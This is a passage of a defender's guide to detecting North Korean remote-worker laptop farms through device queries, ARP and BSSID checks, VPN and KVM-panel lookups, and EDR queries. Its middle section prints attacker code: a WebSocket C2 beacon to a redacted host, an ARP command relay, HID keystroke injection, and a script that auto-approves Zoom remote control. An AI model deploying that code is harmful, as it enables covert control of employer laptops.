| **Tenable Nessus** | Really pushing the intent of this tool now – but you could try:<br><br>**800042** \- USB Device Summary<br><br>**24274** - USB Drives Enumeration (WMI) |

Of course, this is dependent on the laptop farm utilizing default configs for these devices in their setup. This might be more common than you think, if you consider that most [publicly available](https://www.justice.gov/usao-dc/pr/charges-and-seizures-brought-fraud-scheme-aimed-denying-revenue-workers-associated-north) examples suggest DPRK operators are using US facilitators of varying technical aptitude.

Changing the config and making either device is relatively simple, outlined here (<https://docs.pikvm.org/id/>) and here (<https://tinypilotkvm.com/faq/target-detect-tinypilot/#modifying-tinypilots-display-information>). You can try looking for that Corsair Gaming RGB in the PiKVM guide, as some will just follow the guide (I’ve actually seen this one), but a savvy user can look up any product information and fill out the config appropriately.

That said, there are some more generic queries you can use that will grab all USB peripherals as well as video capture devices. This can be useful for comparing individual systems to see if they’ve got weirdness like two “keyboards” plugged in.

**Generic USB and HID Device Detection (Windows)**

```powershell
# List all connected USB hubs
Get-WmiObject Win32_USBHub | Select-Object Name, DeviceID, Status

# List all HID-class devices (e.g., keyboards, mice, some KVMs)
Get-PnpDevice | Where-Object { $\_.Class -eq "HIDClass" -and $\_.Status -eq "OK" }

# Search for suspicious device IDs (fallback if vendor-specific IDs are unknown)
Get-CimInstance -ClassName Win32_PnPEntity |
Where-Object { $\_.PNPDeviceID -like '\*usb\*' -and $\_.Description -match 'Generic|Composite|Capture' } |
Select-Object Description, DeviceID, Manufacturer
```

**Why it's useful:**
These methods help baseline known-good devices and spot **unexpected USB peripherals** such as video capture devices or composite interfaces that often accompany KVM implants. While less precise than vendor-ID-based detections, they are useful for **detecting new, spoofed, or rebranded hardware**.

**Detection of Video Capture Devices (Windows)**

```powershell
# Look for video capture or HDMI-input devices
Get-WmiObject Win32_VideoController | Where-Object { $\_.Name -like "\*capture\*" -or $\_.Name -like "\*USB\*" }

# Check for registry-based hardware fingerprints
Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e96e-e325-11ce-bfc1-08002be10318}\\\*" |
Select-Object DriverDesc, MatchingDeviceId
```

**Why it's useful:**
KVM-over-IP devices often include HDMI or USB video capture components. This technique highlights systems that **expose video input hardware despite no legitimate use case**, particularly on user endpoints where capture functionality is unnecessary.

Setting up a KVM device like this does take some doing, and as public awareness of this scheme grows operators will need to obfuscate what they’re doing when approaching potential farmers. Notionally, it’ll be tough to justify to an unwitting facilitator that receiving, plugging in and configuring strange devices is above-board.

# Endpoint Technical Indicators

But if you start to tie all of these things together, some wider analysis strategies sort of organically come to fruition. As operators increasingly leverage physically co-located infrastructure, using the same farm with devices on the same LAN, defenders must look beyond software telemetry and start interrogating the local network environment itself.

Think Endpoint-resident observations like ARP tables and Wi-Fi SSIDs, which can reveal the presence of unknown or suspicious devices operating nearby. When combined with tools like arp, netsh wlan, or open-source intelligence platforms like [Wigle.net](https://wigle.net/), these techniques allow defenders to map the physical and wireless context of an endpoint, uncovering lateral indicators that traditional EDRs may miss.

A quick note on privacy issues – Uh.. a thing nobody seems to talk about is how most EDR and endpoint tools for remote workforces are able to take a peek at employees’ local LANs. That’s probably a thing that should be talked about more, but I’m not going to touch it today. I’m just going to point out what is possible and how it can be used in the context of this problem set.

## ARP Tables

The idea behind this strategy is the assumption that a DPRK operator on your network is utilizing a laptop farm with other systems on the LAN (i.e. just a simple arp -a). Since all these systems are talking to each other via ARP, you should be able to grab MAC addresses. This can be useful for detecting large numbers of PiKVMs or TinyPilots, for instance. More generally, big lists of systems _might_ be suspect, but that gets tougher for folks with larger device footprints or working in public spaces or a coworking environment. In other words – if I’m seeing 10 RPi’s and 10 Intel NICs – maybe I look into that a bit more. Here’s the MAC prefixes for the devices we’ve discussed thus far:

| Device        | MAC Prefix |
|---------------|------------|
| TinyPilot     | 04c98b     |
| Raspberry Pi  | b827eb     |
| Raspberry Pi  | 28cdc1     |
| Raspberry Pi  | d83add     |
| Raspberry Pi  | dca632     |
| Raspberry Pi  | e45f01     |
| Raspberry Pi  | 2ccf67     |
| Raspberry Pi  | 3a3541     |
| Raspberry Pi  | 88a29e     |


And some simple Powershell

```powershell
arp -a | Select-String '04-C9-8B|B8-27-EB|28-CD-C1|D8-3A-DD|DC-A6-32|E4-5F-01|2C-CF-67|3A-35-41|88-A2-9E'
```

This helps with hardware detection, the assumption being that 1) your DPRK employee is working through a laptop farm and 2) said laptop farm uses PiKVMs or TinyPilots for it’s access. Depending on your EDR (if you have an EDR), you can dig a little deeper into this theory.

## Crowdstrike Falcon’s “Unmanaged Assets”

My real-world experience is primarily with **CrowdStrike Falcon**, so that’s the example I’ll focus on. After reviewing documentation from other EDR platforms, it doesn’t appear that many competitors offer a feature quite like Falcon’s **Unmanaged Assets**, which collects various data points — including hostnames and MAC addresses — to identify nearby devices on the LAN. That said, it’s possible similar capabilities exist under different names or configurations in other tools. This isn’t an endorsement of CrowdStrike; I’m simply highlighting a feature I’ve personally used that proved useful in this specific context.

Anyway – it’s not super clear in publicly available data how exactly this works (a la this [Reddit post](https://www.reddit.com/r/crowdstrike/comments/lf8hms/how_cs_identify_unmanaged_assets/)), but generally speaking you can expect Crowdstrike to look for other neighboring systems that are not checking in to its server to be flagged as “Unmanaged Assets” or “Unsupported Assts”.

![image](https://github.com/user-attachments/assets/48b23cc3-047d-4f4f-995c-d93202f4ff31)

If you have the product, you can apparently read about it here: <https://falcon.crowdstrike.com/documentation/426/asset-discovery>

This is the best publicly available screenshot I could get, but essentially various data points about neighboring systems that DO NOT have a Crowdstrike agent installed OR are not checking in to this particular instance are flagged as “Unmanaged”.

![image](https://github.com/user-attachments/assets/53d2dd4b-78dc-4870-bd0f-ab3612c5711d)

So you can probably imagine how this can be useful. In addition to looking up any “Unmanaged Assets” with MAC addresses matching Raspberry Pi’s or TinyPilots, we can also check suspect systems to see if they are on LANs with large rosters of other systems that look like laptops.

This can be done in either “direction”, meaning you could start with fingerprinted Raspberry Pi’s, see which Managed Asset can see them (and how many), and subsequently identify other laptops on the LAN. Alternatively, you could find Managed Assets with large numbers of Unmanaged Assets associated with them. In this case, look for “business-y” sounding hostnames. “HR-MB001” or “FIN-001”, “OFFICE-DT-204”, “US-BOSTON-ADMIN01” or “NYC-SALES01”. Hostnames like this suggest fleet management, rather than the “Matt’s Laptop” sort of thing you might see with a personally owned device. **KEEP IN MIND** that you might just be looking at a WeWork or a Starbucks – but this is still a valid strategy.

To give a very easy (and on-the-nose) example, let’s say you suspect an employee of being a DPRK operator – on their local LAN, you find Raspberry Pis and 7 other laptops with very corporate sounding names. Falcon makes this easy, but this is still partially observable via simple ARP as well. In either case, I would absolutely be looking further into this.

## BSSID + Wigle

Additionally, using the **BSSID** — the unique MAC address of a Wi-Fi access point — opens up a powerful avenue for geolocation, especially when combined with open-source tools like [Wigle.net](https://wigle.net). When a laptop connects to a wireless network, the BSSID can often be observed via system logs, network telemetry, or endpoint queries. Analysts can take that BSSID and plug it into Wigle’s database, which crowdsources the physical locations of Wi-Fi networks based on prior scans.

This technique becomes especially valuable in the context of **remote work fraud**, where individuals may misrepresent their physical location — claiming to be based in a certain city or region to meet job requirements or evade scrutiny. While it's often difficult for a SOC or analyst to independently verify a user’s actual location, the BSSID provides a quiet but reliable fingerprint of the wireless network the device is connected to. By looking up that BSSID on Wigle.net, analysts can often identify the **approximate physical location** of the access point — sometimes down to a building or block. This doesn’t guarantee you’ve geolocated the person (they could be using a neighbor’s Wi-Fi or tethering), but in practice it offers a useful signal when evaluating claims of geographic presence. For example, if an employee states they are based in Atlanta but their laptop consistently connects through an access point mapped to Malaysia, that’s a flag worth chasing. So in that regard, it should be noted that this use-case is specific to shipping the laptop to another location and not specifically within a laptop farm, though geolocation within your respective country should also work (i.e. if they claim to be working out of City A but the BSSID maps to a location in City B).

![image](https://github.com/user-attachments/assets/d7c9a1b7-8f65-4a5e-9f36-0224613cf5b8)
**“Just checking in from Atlanta”**

| **Tool** | **Query / Command** |
| --- | --- |
| PowerShell (Windows) | netsh wlan show interfaces \| Select-String "BSSID" |
| CMD (Windows) | netsh wlan show interfaces |
| CrowdStrike Falcon (specifically through RTR) | netsh wlan show interfaces (run in RTR shell) |
| osquery | SELECT ssid, bssid, signal_strength FROM wifi_status; |
| Elastic Agent (KQL) | host.name:"hostname" and wifi.bssid:\* |
| SentinelOne XDR (Scripted) | netsh wlan show interfaces (via scripted job) |
| Cortex XDR | _Scripted collection only_ |
| Tenable Nessus | _Don’t think this is collected_ |

# Network Technical Indicators

Alright, network level. There’s two basic approaches I’m aware of in this regard, one that may or may not involve a laptop farm (VPN usage could route through a domestic network but – it also may not, and one that pretty clearly points to remote access into a laptop farm.

## Astrill VPN

One particularly useful starting point is the identification of commercial VPN usage. **Astrill VPN**, in particular, has been cited in reporting related to contractor misuse and fraud originating from the DPRK. It's favored due to its obfuscation capabilities, stable infrastructure, and popularity among users operating from restrictive environments.

Detection of [Astrill VPN](https://cybersecuritynews.com/north-korean-it-workers-using-astrill-vpn/) can involve identifying known IP ranges, DNS resolution of Astrill-related domains (e.g., api.astrill.com, \*.astrillvpn.com), or unusual SSL certificate issuers during traffic inspection. In environments with packet capture or proxy logs, analysts may also look for persistent connections to unfamiliar data centers in Hong Kong, Singapore, or Eastern Europe — common exit points for Astrill. There’s plenty of [public reporting](https://www.silentpush.com/blog/astrill-vpn/) elsewhere on this, but arguably [Spur is the authoritative source](https://spur.us/astrill-vpn-and-remote-worker-fraud/) currently for Astrill VPN IPs. They currently are offering their tracking of Astrill VPN space for free in a simple .txt [right here](https://storage.googleapis.com/spur-astrill-vpn/ips.txt).

## Checking for Login Panels

Once you've identified the **public IP** of a remote worker’s machine — whether through endpoint telemetry, VPN/proxy logs, or EDR metadata — it opens another valuable detection path. Feeding that IP into tools like **Shodan** or **Censys** can reveal any **public-facing services** exposed by that system. If a **TinyPilot**, **PiKVM**, or **Apache Guacamole** interface is discovered accessible on the public internet, that’s a major red flag. It could indicate the worker is exposing a KVM device or remote access system directly to the internet for convenience or for control by a third party. Even if authentication is required, the presence of such services may reflect attempts to quietly manage a laptop farm or facilitate anonymous access. This is also a good supporting step during an investigation – taking what we’ve covered so far, if you’ve got multiple PiKVMs on LAN, a roster of suspect unaffiliated laptops, and now you’ve got a PiKVM log-in screen that’s public facing.. well – you’ve got yourself a nice little case.

Here’s how you’d find them.

![image](https://github.com/user-attachments/assets/fc3b2a02-3d3c-4685-983e-355867887a0d)

Notionally you’d be doing this after you already have a public IP to investigate, but for demonstrative purposes you can use a tool like [Shodan](https://www.shodan.io/) or [Censys](https://search.censys.io/) to grab html headers, titles or body content.

![image](https://github.com/user-attachments/assets/3a803c5e-d51c-4f90-bb86-5053372f7f10)

```
* http.html:'<script src="guacamole'
* http.title:"PiKVM"
* http.title:"TinyPilot"
```

HTTP Title can be changed, but these work in a pinch (plus if you’re drilling into an individual IP, things besides the title should be apparent). I like to grab body html where possible, which is why I’m using a snippet of JavaScript included on most Apache Guacamole logins.

# Very North Korea – Janky/Clever Tricks

Here’s where things get interesting and I have my suspicions that quite a bit of this is out there. If the FBI is to believed that [“thousands” of workers](https://apnews.com/article/north-korea-weapons-program-it-workers-f3df7c120522b0581db5c0b9682ebc9b) are embedded across workforces, there has to be some more low-detection mechanisms in place that are allowing for persistence. In other words, whether it is being designed intentionally or not, there has to be some level of uniformity either coalescing organically or being deployed by design. At scale, I’m skeptical that so many organizations would allow for RMM tools like AnyDesk to be installed. I’m not naïve, but that simply cannot be the overarching strategy here.

I’m similarly skeptical of boutique (and relatively expensive, at scale.. ~$400 a pop) devices, which require at least a moderate level of technical proficiency in order to configure them, as the approach of choice as well. Particularly when you consider the obfuscation required, operators essentially must coach a farmer through configuration or send them a preconfigured device. All of this gets too messy too fast, and keep in mind this scheme also relies on not making your employer suspicious.

While both of these approaches absolutely do exist and are used, I don’t see it as cost-effective when there are other strategies you can employ that are arguably harder to detect, less expensive to deploy, and are minimal labor load and technical skill requirement on the part of the hosting laptop farmer. It’s much simpler, cheaper and stealthier to just set up a Zoom meeting once a day and grant control to the remote operator. I think this is probably the most common technique.

That said I should note my own bias creeping in – I’ve personally seen a lot more of the Zoom sharing than any fancy hardware (and I’ve frankly never worked anywhere where someone could just install AnyDesk, so I can’t speak to that).

## Zoom Meetings and Web Socket C2

So what am I talking about here? Essentially at the very basic user level, I’m referring to the practice of using Zoom or a similar meeting platform to share the screen of a target machine and hand over remote control to the operator. This is painfully simplistic, virtually indistinguishable from other legitimate remote work, and extremely low-cost. The challenge here is setting up a mechanism to ensure persistent remote-control day after day. This can certainly be facilitated by the laptop farmer manually, but as I mentioned, it is likely getting increasingly more difficult to find laptop farmers, and it is likely that any level of anonymization and obfuscation (e.g. “I had no idea, I just plug the laptops in and let them run”) is preferred by the farmers. So what to do?

Currently the best sourcing on this is [Sygnia](https://www.sygnia.co/blog/unmasking-north-korean-it-farm/), but there’s snippets of this and the supporting code floating around. In short – there’s a few different ways operators are being found to be persisting via the “Zoom Meeting Method”. **First**, basic Powershell and Power Automate to automate a join and relinquishing of screen control once a day, **second**, lightweight Python scripts on the target system itself receives commands via ARP from a standalone controller device (I know – trust me on this) to launch a Zoom meeting, or perhaps most elegantly – Raspberry Zero HIDs devices receiving automation commands. I’ll go in order.

### All Windows – Power Automate / PowerShell

This is generally the most simple way to do this but coincidentally also one of the most detectable. It’s primarily accomplished via automation in Power Automate or PowerShell and is a relatively simple way to ensure persistence for daily work. Essentially, a pre-scheduled Zoom meeting is accessed via direct url (zoommtg://), launched via .ps1 scheduled task or direct from Power Automate, and utilizes a .NET class to automate a key press. A critical piece of the chain involves using SendKeys to automate pressing the ENTER key, generally timed to coincide with a pop-up request for control from the operator that has joined the meeting from the other side.

The Powershell might look something like this:

```powershell
# Launch Zoom with a specific meeting URI
Start-Process "zoommtg://zoom.us/join?action=join&confno=123456789&pwd=examplepass"

# Wait for Zoom to open and the remote control request to appear
Start-Sleep -Seconds 12 # this is variable

# Load the necessary .NET class for SendKeys
Add-Type -AssemblyName System.Windows.Forms

# Send the "Enter" key to approve remote control
[System.Windows.Forms.SendKeys\]::SendWait("{ENTER}")
```

And the workflow would look something like this:

![image](https://github.com/user-attachments/assets/02591835-c9b2-466f-bc3d-0610f784ac9e)


### Summarizing Sygnia’s Work

[Sygnia’s investigation](https://www.sygnia.co/blog/unmasking-north-korean-it-farm/) uncovered a covert command-and-control (C2) mechanism presumably used by a North Korean IT worker operating inside a legitimate company. The infrastructure included a series of Python scripts running locally on the operator's system, enabling communication with a [remote WebSocket server](https://www.blackhillsinfosec.com/command-and-control-with-websockets-wsc2/). A presence beaconing script periodically sent the current username to the C2 server via HTTP POST, while a WebSocket client maintained a persistent connection to receive real-time commands such as launching Zoom meetings or simulating keyboard input. These commands were executed locally using subprocess calls and tools like [xdg-open](https://linux.die.net/man/1/xdg-open) and [xdotool](https://github.com/jordansissel/xdotool), suggesting the use of a Unix-like operating system.

```python
import websocket
import json
import subprocess  
import os
import requests

C2 = "ws://[REDACTED]/"
USER_NAME = os.getenv("USER")


def send_presence():
   requests.post(C2, json={"username": USER_NAME})

def on_message(ws, message):
   data = json.loads(message)
   if data.get("command") == "open_zoom":
        subprocess.run(["xdg-open", "zoommtg://zoom.us/start"])
    elif data.get("command") == "approve_remote":
      subprocess.run(["xdotool", "key", "Return"])
ws = websocket.WebSocketApp("ws://[REDACTED]", on_message=on_message) ws.run_forever()
```  

To extend control to nearby systems, the setup also used ARP-based communication. A “Command Rebroadcast Relay” script crafted ARP packets containing command identifiers within the hwsrc field and broadcast them on the local network. Companion scripts on other systems acted as passive ARP listeners, monitoring for these packets using Scapy. When a matching ARP packet was received, the listener extracted the payload and forwarded it back to the attacker’s C2 server. This notionally enabled real-time coordination of multiple compromised systems within the same LAN.

```python  
from scapy.all import sniff, sendp, Ether, ARP   

def process_arp(packet):
    if ARP in packet and packet[ARP].op == 1:
        payload = packet[ARP].hwsrc
        forward_to_c2(payload)  

sniff(filter="arp", prn=process_arp)

def rebroadcast_command(command):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, hwsrc=CHANNEL_ID,
psrc="0.0.0.0")
    sendp(packet, iface="eth0")
```

That would mean the C2 would look something like this:

![image](https://github.com/user-attachments/assets/da6e5443-f2b6-4678-89cf-f37d124c4240)

In which a controller on the LAN would receive the WebSocket C2 and rebroadcast over ARP to all listeners. This would obviously require each system on LAN to have a listener also configured and subsequently execute commands. Again, keep in mind – this is happening off the enterprise network that the Operator is eventually working on, and thus – at least network-traffic wise, essentially undetectable.

### Conceptualizing How it Works

I spent a lot of time trying to figure out how this would work, since the writeup explicitly mentions forensics on an organization’s laptop. The writeup mentions tools specific to Linux (xdg-open and xdotool), and I was skeptical that a company was shipping out Linux distros to its remote workers.

Trying to fit this into Windows, a laptop would need to run [scapy](https://scapy.net/) to receive and interpret the ARP commands, which does require installation of [npcap](https://npcap.com/windows-10.html) in order to work. Then, it would be trivial to call a python script as in the use-case, but would have to swap out xdg-open and xdotool with something like Powershell in order to work. It might look something like this:

![image](https://github.com/user-attachments/assets/9bb551f4-90cb-4f5b-b429-f49c86095103)

This didn’t look feasible to me. If a user could install npcap, it would stand to reason that they might just opt for something like AnyDesk for simplicity. This may exist in the wild as a hybridized approach, but it seems a little too wonky to make sense. The ARP listener also suggests that this laptop would also be beaconing back over WebSocket to the C2 to confirm receipt of the command. This is detectable.

![image](https://github.com/user-attachments/assets/47a50ee6-03b5-4eda-a6d8-3da53e6e0c72)

It's also not super sophisticated. Again, this didn’t make sense. If you’re going to risk C2 detection on network, then why bother with the obfuscation that comes with Zoom screen sharing?

### Bringing it All Together: Back to the Raspberry Pis

Spoiler – here is what I was overlooking. The /dev/hidg0 portion of the code snippets is critical. In addition to the network-based control, Sygnia observed the use of USB-based HID injection. A script decoded base64-encoded input events and wrote them directly to /dev/hidg0, a Linux device interface for simulating keyboard input. This method allowed the attacker to mimic human interaction—such as accepting Zoom remote control requests—on a connected machine. All observed scripts and techniques were reportedly discovered on a laptop submitted for forensic investigation after a law enforcement raid

```python
import base64  

def replay_input(encoded_event):
   decoded = base64.b64decode(encoded_event)
   with open("/dev/hidg0", "wb") as f:
       f.write(decoded)
```
 
In the original writeup, this was presented as “found on the laptop”, and that may be so, but this is highly suggestive of additional devices on the network explicitly used to control said laptops. More specifically, this python receives the base64 encoded ARP command (literally only ‘open_zoom’ or ‘approve_remote’) and writes it directly to /dev/hidg0. This kernel device interface is _only_ available when USB Gadget mode is enabled. The subprocess.run() commands afterward suggest the corresponding execution for each of these commands:

```python
subprocess.run(["xdg-open", "zoommtg://zoom.us/start"], check=True)
subprocess.run(["xdotool", "key", "Return"], check=True)
```

Again, Linux commands. So assuming accuracy in the writeup, this had to be in a dev environment or something. Maybe I’m way out of touch, but I still can’t see corporate Linux desktops being shipped out to remote workers. That said, it does jive with the earlier look at how the C2 functions. Commands short enough to be encoded within the hwsrc field of an ARP packet would allow the operator to first broadcast ‘open_zoom’, wait, and then broadcast ‘approve_remote’ after the operator manually requests control within the Zoom meeting. Honestly, it’s clever, scalable and impossible to detect on an enterprise – as it is happening entirely on the laptop farm’s LAN. Since we’re talking about low-cost HID devices as well, this could be accomplished with cheap $10-$15 [Raspberry Pi Zeros.](https://www.raspberrypi.com/products/raspberry-pi-zero/) Assuming multiple Operators colluding within the same LAN, this also allows everybody to start work at the same time using the same ARP rebroadcast.

Subsequently, this does offer us an opportunity to speculate as to how this might work at scale _and_ on what is likely to be a significantly larger percentage of fleet Windows machines across multiple organizations.

Conceivably, it would look something like this on Windows, in which the two short commands to write to /dev/hidg0 would be a simple CMD run (WIN+R) to a preconfigured Zoom meeting direct-to-url, followed by a simple button press of the ENTER key:

![image](https://github.com/user-attachments/assets/b5763549-175d-4b81-a4e7-351fbecce98d)

It is maddeningly simple and virtually indistinguishable from normal traffic. That said, this would also suggest a relatively sophisticated setup effort on the part of DPRK operators, which would need to ship multiple RasPi Zeros and MicroSDs to a laptop farm, and subsequently instruct the farmer to download (likely) preconfigured OSes to each MicroSD. These would need to be trivially preconfigured with the Python code that includes the /dev/hidg0 inputs and at least one with the WebSocket C2. From there, it’s just plug and play.

This also aligns with the C2 design and actually suggests a certain level of redundancy. If every Pi Zero is a listener/controller but _is also talking to the WebSocket C2_, then you have multiple failovers rebroadcasting the ARP traffic to all the other controllers as well. Therefore, the C2 on LAN might look something like this:

![image](https://github.com/user-attachments/assets/cb82c532-b5ea-4d6e-b349-9a293e65d993)

### So What’s the Point?

This is obviously speculative/theoretical, but we’ve read a ton about “thousands of DPRK remote workers” and I wanted to understand how that could work at scale. This setup conceivably _works at scale_, essentially “factory farming” local facilitators in a way that leaves all indicators functionally off detectable telemetry. To defenders, this looks like a daily standup meeting for each individual user, frankly, but provides direct control to DPRK remote operators in a way that scales across an entire laptop farm in a repeatable and redundant fashion.

### And Is It Detectable?

Honestly.. yes? Kind of? If the Sygnia code is consistent across this operation, the usage of the direct-to-url _zoommtg://_, especially if run from the Run dialog, is something to key in on. Further, there are some methods to follow-up on that Zoom launch to see if the meeting remains persistent for a full day. I won’t go through all the tools for all this, but to use some simple SQL and Crowdstrike as an example:

**What to Look For in EDR (e.g., CrowdStrike Falcon):**

**1\. Zoom URI Invocation (zoommtg://...) via Run Dialog**

- If the HID device simulates Win+R followed by zoommtg://...:
  - **CrowdStrike would likely log this as a cmd.exe-less user shell invocation** or explorer.exe launching a URI.
  - Look for child processes of explorer.exe or RuntimeBroker.exe without a parent cmd.exe.

**2\. Foreground Window Change / Shell Execution**

- EDRs often capture shell execution events, even if no binary is dropped.
- The HID input will make Zoom the foreground app — this may be correlated with a zoom.exe process spawning immediately after an untyped shell interaction.

**3\. Unusual Input Sequences**

- If the HID device is used **without the user's interaction**, the pattern of keystrokes (e.g., Win+R, short delay, URI, Enter) could look anomalous:
  - Especially if it happens consistently at the same time.
  - Or if it happens when the user is marked as inactive.

**4\. Zoom Process Activity**

- CrowdStrike will definitely track zoom.exe execution:
  - If it runs with unusual parent-child relationships (e.g., no clear originating app or script).
  - Or if it happens without any keyboard or mouse input from a real user.

**Detection Strategy Example (Pseudo Falcon Query Syntax)**

```sql
event_type=ProcessRollup2
| filter (ImageFileName="zoom.exe" OR CommandLine CONTAINS "zoommtg://")
| filter ParentImageFileName="explorer.exe"
| filter NOT CommandLine CONTAINS "C:\\Program Files\\Zoom\\bin\\Zoom.exe"
| filter Timestamps WITHIN user_inactive_window
```

This would help isolate Zoom executions that:

- Were likely triggered by shell input (vs a Zoom shortcut or scheduled meeting).
- Occurred when there was no recent user interaction (suggesting automation or HID input).

You can extend this strategy further by comparing the launches over time as well. Conceivably, your DPRK operator is going to be running this daily – first thing every morning, so mapping the Run dialog launch against the timestamps may reveal daily launches using the same automation, like so:

```sql
event_platform="Win" 
| event_type="ProcessRollup2" 
| ImageFileName:contains="\\Zoom.exe" 
| CommandLine:contains="zoommtg://" 
| ParentImageFileName="explorer.exe" 
| NOT CommandLine:contains="chrome.exe" 
| NOT CommandLine:contains="firefox.exe" 
| NOT CommandLine:contains="msedge.exe" 
| NOT ParentCommandLine:contains="Zoom.exe" 
| NOT ParentImageFileName IN ("chrome.exe", "firefox.exe", "msedge.exe") 
| DeviceUserName!="SYSTEM" 
| fields DeviceName, DeviceUserName, Timestamp, CommandLine 
| groupby DeviceName, DeviceUserName
```

So that will give you non-standard Run dialog Zoom launches over time, which is odd enough considering the average user is going to open the UI and launch their meetings, or click a link (which tends to be https:// in meeting invites). The only other odd behavioral indicator with these meetings is their length – operators are going to be screen-share remote-controlling all day long. So once you have your list of possibles, there’s Powershell you can run on them periodically throughout the day:

```powershell
Get-Process | Where-Object { $\_.MainWindowHandle -ne 0 } | Select-Object Name, Id, MainWindowTitle
```

This will give you all active apps with visible windows. Thus, a Zoom meeting lasting all day long will always be active. You can script this to loop a bunch of times for more data points – but this is still arguably imperfect.

### Back to that Hardware Detection

That hardware detection way back up there ^^ with ARP tables is useful here. If the setup is using these Pi Zeros, the detection strategies for EDR or the simple Powershell (repeated here) will be handy:

```powershell
arp -a | Select-String '04-C9-8B|B8-27-EB|28-CD-C1|D8-3A-DD|DC-A6-32|E4-5F-01|2C-CF-67|3A-35-41|88-A2-9E'
```

![image](https://github.com/user-attachments/assets/22b10f65-73d3-482c-a5fa-fe30eee0c08e)

# Wrapping it All Up

Okay so that just kept going. WAY longer than I anticipated, but I wanted to do my best at an authoritative guide. Ultimately, the detection of DPRK-linked laptop farms and remote worker schemes requires defenders to look beyond traditional indicators of compromise and start asking different questions—about infrastructure, behavior, and access. These campaigns aren’t just about malware or phishing; they’re about deception at scale, often executed in ways that blend seamlessly with legitimate remote work. By combining endpoint telemetry, LAN observations, hardware footprinting, and creative pivots like BSSID geolocation or ARP sniffing, we can begin to expose patterns that might otherwise go unnoticed. This isn’t about catching every instance—it’s about shrinking the haystack, understanding the tradecraft, and spotting the anomalies that point to something bigger.
